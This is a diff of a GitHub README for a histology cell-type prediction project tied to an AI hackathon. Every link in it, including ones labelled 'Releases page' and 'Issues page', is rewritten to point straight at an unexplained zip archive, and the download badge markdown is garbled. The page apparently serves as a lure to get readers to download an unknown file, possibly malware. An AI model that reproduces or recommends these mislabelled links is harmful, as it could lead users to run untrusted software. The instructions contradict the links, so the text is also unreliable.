@@ -4,7 +4,7 @@
 This project offers a top 204 solution for the Elucidata AI Challenge 2025. It focuses on predicting the spatial cell-type composition from histology images. Using advanced techniques like Convolutional Neural Networks (CNNs) with EfficientNet and ResNet backbones, the application integrates multi-scale patching and coordinate-aware ensemble modeling to provide accurate results.
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip%20Latest%https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip)](https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip)
+[![Download](https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip%20Latest%https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip)](https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application effectively.
@@ -17,7 +17,7 @@ Ensure your system meets the following requirements:
 - **Storage:** Minimum of 1 GB of available disk space.
 
 ### Step 2: Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip) to find the latest version of the application.
+Go to the [Releases page](https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip) to find the latest version of the application.
 
 ### Step 3: Download the Application
 On the Releases page, look for the latest version. You will see multiple files available for download. Click the file that matches your operating system to start the download.
@@ -55,7 +55,7 @@ If you face issues while running the application:
 If you still need assistance, consider reaching out via the repository's Issues page on GitHub. The community or maintainers can often provide guidance.
 
 ## 🔗 Important Links
-- [Releases Page](https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip)
-- [Issues Page](https://raw.githubusercontent.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/main/central/Global-AI-Kaggle-Hackathon-2025-Elucidata.zip) 
+- [Releases Page](https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip)
+- [Issues Page](https://github.com/alphaloop94/Global-AI-Kaggle-Hackathon-2025-Elucidata/raw/refs/heads/main/central/Kaggle-Global-Elucidata-Hackathon-A-v3.4-alpha.2.zip) 
 
 Thank you for using Global-AI-Kaggle-Hackathon-2025-Elucidata!
